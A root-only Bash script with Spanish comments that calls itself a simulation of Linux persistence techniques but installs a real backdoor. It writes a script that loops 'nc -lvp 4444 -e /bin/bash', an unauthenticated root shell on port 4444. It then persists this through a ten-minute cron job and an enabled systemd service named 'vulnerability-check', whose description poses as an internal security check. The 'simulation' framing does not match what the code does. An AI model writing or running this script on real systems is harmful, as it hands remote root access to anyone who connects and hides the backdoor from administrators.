#!/bin/bash
# ==============================================================================
# Script de Simulación de Técnicas de Persistencia Linux (Versión Pro)
# ==============================================================================

# 1. Asegurar privilegios de root (Necesario para escribir en /usr/local/bin y crontab)
if [ "$EUID" -ne 0 ]; then
    echo -e "\e[31m[-] Error: Este script requiere privilegios de root (sudo).\e[0m"
    exit 1
fi

BACKDOOR_PATH="/usr/local/bin/backdoor_service.sh"
PUERTO_PERSISTENCIA="4444"

# 2. Creación del script de persistencia real (Mecanismo de escucha pasivo)
setup_backdoor_binary() {
    echo -e "\e[34m[*] [1/3] Creando script de escucha local en $BACKDOOR_PATH...\e[0m"
    
    # Genera un script que abre una shell inversa simulada usando netcat si se conecta alguien
    cat << 'EOF' > "$BACKDOOR_PATH"
#!/bin/bash
# Simulación de listener interactivo para persistencia corporativa
while true; do
    nc -lvp 4444 -e /bin/bash >/dev/null 2>&1
    sleep 5
done
EOF

    chmod +x "$BACKDOOR_PATH"
}

# 3. Persistencia mediante tareas programadas (Cronjob Seguro sin Duplicados)
setup_cronjob() {
    echo -e "\e[34m[*] [2/3] Configurando tarea cron para persistencia...\e[0m"
    CRON_LINE="*/10 * * * * $BACKDOOR_PATH"

    # Verifica de forma segura si la tarea ya existe en el crontab antes de añadirla
    crontab -l 2>/dev/null | grep -Fq "$BACKDOOR_PATH"
    if [ $? -ne 0 ]; then
        (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab -
        echo -e "\e[32m[+] Tarea programada añadida con éxito.\e[0m"
    else
        echo -e "\e[33m[!] La tarea programada ya se encuentra registrada. Omitiendo.\e[0m"
    fi
}

# 4. Persistencia Moderna: Creación de un Servicio Systemd (Estándar de la Industria)
setup_systemd_service() {
    echo -e "\e[34m[*] [3/3] Instalando persistencia a nivel de servicio Systemd...\e[0m"
    SERVICE_FILE="/etc/systemd/system/vulnerability-check.service"

    cat << EOF > "$SERVICE_FILE"
[Unit]
Description=Servicio de Verificacion de Seguridad Interna
After=network.target

[Service]
Type=simple
ExecStart=$BACKDOOR_PATH
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

    # Recarga el demonio de systemd y arranca el servicio simulado
    systemctl daemon-reload
    systemctl enable vulnerability-check.service >/dev/null 2>&1
    systemctl start vulnerability-check.service >/dev/null 2>&1
    echo -e "\e[32m[+] Servicio Systemd 'vulnerability-check' instalado y activo.\e[0m"
}

# Ejecución del Framework de Persistencia
setup_backdoor_binary
setup_cronjob
setup_systemd_service

echo "----------------------------------------------------------------------"
echo -e "\e[32m[+] Simulación de persistencia Linux completada.\e[0m"
echo -e "\e[33m[*] El puerto $PUERTO_PERSISTENCIA quedará monitoreado por el servicio local.\e[0m"
